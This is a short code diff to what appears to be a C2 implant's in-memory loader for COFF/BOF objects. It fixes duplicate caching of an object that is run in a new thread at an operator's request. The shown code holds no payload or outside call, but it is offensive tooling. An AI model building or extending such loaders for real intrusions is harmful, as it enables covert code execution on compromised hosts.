@@ -227,6 +227,7 @@ namespace Memory {
         VOID LoadObject(_parser parser) {
 
             _coff_params* coff = (_coff_params*) Malloc(sizeof(_coff_params));
+            _coff_params* saved = nullptr;
 
             coff->entrypoint    = UnpackString(&parser, (uint32_t*) &coff->entrypoint_length);
             coff->data          = UnpackBytes(&parser, (uint32_t*) &coff->data_size);
@@ -237,12 +238,12 @@ namespace Memory {
 
             // TODO: test that coff data size being zero is a correct way to do this
             if (!coff->data_size) {
-                _coff_params *get = GetCoff(coff->coff_id);
+                saved = GetCoff(coff->coff_id);
 
-                coff->data              = get->data;
-                coff->data_size         = get->data_size;
-                coff->entrypoint        = get->entrypoint;
-                coff->entrypoint_length = get->entrypoint_length;
+                coff->data              = saved->data;
+                coff->data_size         = saved->data_size;
+                coff->entrypoint        = saved->entrypoint;
+                coff->entrypoint_length = saved->entrypoint_length;
             }
 
             if (!CreateUserThread(NtCurrentProcess(), X64, (void*) CoffThread, coff, nullptr)) {
@@ -250,7 +251,10 @@ namespace Memory {
                 return;
             }
 
-            AddCoff(coff);
+            if (!saved) {
+                AddCoff(coff);
+            }
+
             // NOTE: operator now has the option to remove a BOF any time
             if (!coff->b_cache) {
                 RemoveCoff(coff->coff_id);
